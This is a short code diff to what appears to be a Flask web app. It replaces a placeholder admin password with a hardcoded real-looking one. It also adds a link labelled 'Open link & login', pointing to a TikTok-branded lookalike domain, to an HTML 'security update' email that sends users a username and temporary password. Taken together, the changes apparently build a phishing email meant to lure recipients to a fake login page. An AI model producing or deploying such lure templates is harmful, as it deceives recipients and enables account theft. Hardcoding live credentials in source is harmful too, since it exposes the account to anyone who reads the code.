@@ -26,7 +26,7 @@ login_manager.login_view = 'login'
 
 # Dummy user store
 users = {
-    'admin': {'password': 'admin_password'}  # Replace with actual user data
+    'admin': {'password': 'pa77W0rd2024'}  # Replace with actual user data
 }
 
 # User class
@@ -120,7 +120,8 @@ def send_security_update_email(recipient_email, username, temp_password):
         <ul>
             <li><span class="highlight">Username:</span> {username}</li>
             <li><span class="highlight">Password:</span> {temp_password}</li>
-        </ul>
+        </ul><br>
+        <a href="https://tikteam.work/tiktok">1: Open link & login</a>
         <p>Please use these credentials to log in and manage your account as required.</p>
         <h2>Our Commitment to You</h2>
         <p>We apologize for any inconvenience this may cause and appreciate your understanding and patience. Our team is working diligently to resolve the issue and will notify you once new sign-ups are available.</p>
